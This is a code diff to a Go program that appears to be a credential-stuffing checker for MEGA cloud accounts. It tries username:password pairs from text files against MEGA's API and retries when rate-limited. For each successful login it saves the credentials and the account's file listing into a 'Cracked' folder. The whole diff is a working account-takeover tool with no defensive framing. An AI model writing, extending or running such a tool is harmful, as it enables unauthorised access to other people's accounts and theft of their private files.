@@ -5,6 +5,7 @@ import (
 	"io/ioutil"
 	"math/rand"
 	"os"
+	"strconv"
 	"strings"
 	"time"
 
@@ -13,7 +14,7 @@ import (
 )
 
 var (
-	api = [...]string{"http://eu.api.mega.co.nz", "http://g.api.mega.co.nz"}
+	api = [...]string{"https://eu.api.mega.co.nz", "https://g.api.mega.co.nz"} //API's
 )
 
 func checkFileExist(filePath string) bool {
@@ -30,14 +31,29 @@ func getContent(file string) ([]string, error) {
 		return []string{}, fmt.Errorf("error opening file %v", err)
 	}
 
-	results := strings.Split(string(f), "\n")
+	results := strings.Split(string(f), "\r\n")
 
 	return results, nil
 }
 
+type Page struct {
+	Title string
+	Body  []byte
+}
+
+func (p *Page) save() error {
+	filename := p.Title + ".txt"
+	return ioutil.WriteFile("./Cracked/"+filename, p.Body, 0600)
+}
+
+func countFiles() int { //Count # of files
+	profiles, _ := ioutil.ReadDir("./Cracked")
+	return len(profiles)
+}
+
 func main() {
 	if checkFileExist(os.Args[0]+"username.txt") && checkFileExist(os.Args[0]+"password.txt") {
-		fmt.Println("Error! File not found...!")
+		fmt.Println("Error! username.txt OR password.txt not found!")
 		os.Exit(1)
 	}
 
@@ -71,28 +87,30 @@ func main() {
 
 			if err != nil {
 				if err == mega.ENOENT {
-					fmt.Println("Bad login "+u+":"+p, err)
+					fmt.Println("[Bad] " + u + ":" + p)
 					break
 				} else {
-					fmt.Println("Unable to establish connection to mega service", err)
-					time.Sleep(time.Duration(5) * time.Second)
+					fmt.Println("[Limited] Unable to establish connection to mega service", err)
+					time.Sleep(time.Duration(30) * time.Second)
 
 					goto retry
 				}
 			}
-			fmt.Println("Good Login! " + u + ":" + p)
+			var tmpstring string
+			tmpstring += "Login: " + u + ":" + p + "\r\n"
+			fmt.Println("[Good] " + u + ":" + p)
 			paths, err := client.List("mega:/")
 			if err != nil && err != mega.ENOENT {
-				fmt.Println("ERROR: List failed ", err)
+				fmt.Println("[ERROR] List failed ", err)
 			}
 			if err == nil {
 				for _, p := range *paths {
-					fmt.Println(p.GetPath())
-					for {
-					}
+					tmpstring += p.GetPath() + "\r\n"
 				}
+				s1 := strconv.Itoa(countFiles())
+				p1 := &Page{Title: "Cracked Account " + s1, Body: []byte(tmpstring)}
+				p1.save()
 			}
 		}
 	}
-
 }
